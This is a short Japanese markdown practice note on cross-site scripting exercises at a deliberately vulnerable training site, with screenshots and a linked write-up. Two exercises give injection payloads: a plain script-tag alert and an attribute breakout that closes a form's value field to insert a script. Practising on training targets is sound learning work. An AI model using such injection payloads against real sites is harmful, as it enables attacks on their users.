<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [練習](#%E7%B7%B4%E7%BF%92)
  - [xsssample](#xsssample)
    - [1](#1)
    - [2](#2)
    - [3](#3)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# 練習
## xsssample
http://bogus.jp/xsssample/   
writeupは以下   
https://qiita.com/gky360/items/175b8f1b4ca6f71644f4   
### 1
http://bogus.jp/xsssample/xsssample_01.php   
![image](https://user-images.githubusercontent.com/56021519/103071017-289c1d80-4606-11eb-86d4-a051e0fdd02c.png)   
普通に`<script>alert(1);</script>`   
### 2 
http://bogus.jp/xsssample/xsssample_02_M9eec.php   
![image](https://user-images.githubusercontent.com/56021519/103071081-436e9200-4606-11eb-8619-31160c8b6b82.png)   
以下のようにvalueの中に入力がセットされる。   
```txt
<form method="get" action="">login<br>
username<input name="user" type="text" value="aaa"><br>
password<input name="pass" type="password" value=""><br>
<input type="submit" value="login">
</form>
```
`a"><script>alert(1);</script>`

### 3
http://bogus.jp/xsssample/xsssample_03_J4Skr.php   
![image](https://user-images.githubusercontent.com/56021519/103071232-8d577800-4606-11eb-89c7-fff87f8644bc.png)   

